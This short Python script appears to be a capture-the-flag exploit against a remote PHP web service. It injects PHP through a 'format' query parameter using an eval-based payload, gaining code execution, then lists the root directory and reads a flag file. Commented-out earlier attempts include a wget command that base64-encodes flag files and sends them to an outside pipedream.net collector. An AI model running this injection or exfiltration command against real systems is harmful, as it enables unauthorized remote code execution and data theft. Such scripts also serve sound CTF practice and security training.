import requests
from urllib.parse import quote
from icecream import ic

# host = 'http://localhost:1337'
host = 'http://167.99.195.247:31128'

# OLD Command execution
# command = 'wget https://eoibtsmej5g1snf.m.pipedream.net/ --header "Yeet: $(cat /flag* | base64 -w 0)"'
# command = 'wget https://eoibtsmej5g1snf.m.pipedream.net/'
# command = 'sleep 12345'
# url = f"{host}/?format=${{eval($_GET[1])}}=123)&1=exec('{quote(command).replace('/', '%2F')}');"

# New (change filename)
php = "$a = scandir('/'); print_r($a); $b = file_get_contents('/flagABIiW'); echo $b;"

url = f"{host}/?format=${{eval($_GET[1])}}&1={quote(php).replace('/', '%2F')}"
ic(url)

res = requests.get(url)

print(res.text)
